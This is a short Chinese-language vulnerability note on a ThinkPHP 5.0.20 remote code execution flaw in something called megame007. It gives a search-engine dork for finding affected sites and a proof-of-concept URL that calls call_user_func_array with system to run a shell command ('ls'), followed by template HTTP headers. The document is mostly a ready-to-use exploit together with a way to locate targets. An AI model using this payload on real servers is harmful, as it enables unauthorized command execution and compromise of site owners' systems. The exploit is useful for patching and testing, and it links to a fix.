# megame007远程代码任意执行漏洞
利用此漏洞可以任意执行代码
# GOOGLE
title:megame007

# 漏洞简介
|漏洞名称|上报日期|漏洞发现者|版本|CVE编号|
|--|--|--|--|--|
|thinkphp5框架缺陷导致远程代码执行|2024-7-22|AMEN|5.0.20|[点击(内有修复方案)](https://blog.ymypay.cn/index.php/2024/07/22/thinkphprce/)|
# POC
```
https://your-host/?s=/admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls
```
```
Host: your-host
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: your-UserAgent
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
```
